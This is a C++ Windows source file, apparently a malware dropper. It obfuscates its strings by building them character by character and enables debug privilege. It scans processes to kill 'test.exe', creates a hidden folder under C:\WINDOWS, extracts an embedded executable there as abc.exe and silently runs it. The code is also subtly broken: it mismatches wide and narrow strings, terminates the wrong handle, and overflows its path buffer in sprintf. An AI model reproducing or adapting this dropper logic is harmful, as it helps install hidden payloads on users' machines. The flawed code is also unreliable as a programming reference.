// test.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <Windows.h>
#include <Tlhelp32.h>
#include "resource.h"

char * My_LoadResource(char *str)
{
	char zvsrt[8];
	zvsrt[0] = 'a';
	zvsrt[1] = 'b';
	zvsrt[2] = 'c';
	zvsrt[3] = '.';
	zvsrt[4] = 'e';
	zvsrt[5] = 'x';
	zvsrt[6] = 'e';
	zvsrt[7] = '\0';

	HRSRC hRsrc = FindResource(NULL,MAKEINTRESOURCE(IDR_EXE1),TEXT("exe"));
	HGLOBAL hGlobal = LoadResource(NULL,hRsrc);
	LPVOID res = LockResource(hGlobal);
	DWORD size = SizeofResource(NULL,hRsrc);
	
	sprintf(str,"%s\\%s",str,zvsrt);

	FILE * result = fopen(str,"wb");
	if (result)
	{
		fwrite(res,1,size,result);
		fclose(result);
	}
	return str;
}
BOOL EnablePrivilege()//提升当前进程权限
{
	HANDLE hToken = NULL;
	BOOL bFlag = FALSE;

	if(OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES,&hToken))//获取进程的令牌信息
	{
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		if (!LookupPrivilegeValue(NULL,SE_DEBUG_NAME,&tp.Privileges[0].Luid))//
		{
			CloseHandle(hToken);
			return FALSE;
		}
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		if (!AdjustTokenPrivileges(hToken ,FALSE ,&tp, sizeof(tp), NULL, NULL))
		{
			return FALSE;
		}
	}
	CloseHandle(hToken);
	return TRUE;
}
int _tmain(int argc, _TCHAR* argv[])
{
	char buffer[9];
	buffer[0] = 't';
	buffer[1] = 'e';
	buffer[2] = 's';
	buffer[3] = 't';
	buffer[4] = '.';
	buffer[5] = 'e';
	buffer[6] = 'x';
	buffer[7] = 'e';
	buffer[8] = '\0';

	EnablePrivilege();
	HANDLE handle1 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	PROCESSENTRY32W pe = {sizeof(PROCESSENTRY32W)};
	

	Process32FirstW(handle1,&pe);

	do 
	{
		if (0 == stricmp((const char *)(pe.szExeFile),buffer))
		{
			OpenProcess(PROCESS_TERMINATE,NULL,pe.th32ProcessID);
			TerminateProcess(handle1,0);
			CloseHandle(handle1);
			return 0;
		}
	} while(Process32NextW(handle1,&pe));
	
	CloseHandle(handle1);

	char wfnfo[22];
	wfnfo[0] = 'C';
	wfnfo[1] = ':';
	wfnfo[2] = '\\';
	wfnfo[3] = 'W';
	wfnfo[4] = 'I';
	wfnfo[5] = 'N';
	wfnfo[6] = 'D';
	wfnfo[7] = 'O';
	wfnfo[8] = 'W';
	wfnfo[9] = 'S';
	wfnfo[10] = '\\';
	wfnfo[11] = '1';
	wfnfo[12] = '2';
	wfnfo[13] = '3';
	wfnfo[14] = '4';
	wfnfo[15] = '5';
	wfnfo[16] = '6';
	wfnfo[17] = '7';
	wfnfo[18] = '8';
	wfnfo[19] = '9';
	wfnfo[20] = '0';
	wfnfo[21] = '\0';

	CreateDirectoryA(wfnfo,NULL);

	SetFileAttributesA(wfnfo,FILE_ATTRIBUTE_HIDDEN);

	char * str2 = My_LoadResource(wfnfo);
	
	ShellExecuteA(NULL,"open",str2,NULL,wfnfo,1);
	ExitProcess(0);

	return 0;
}

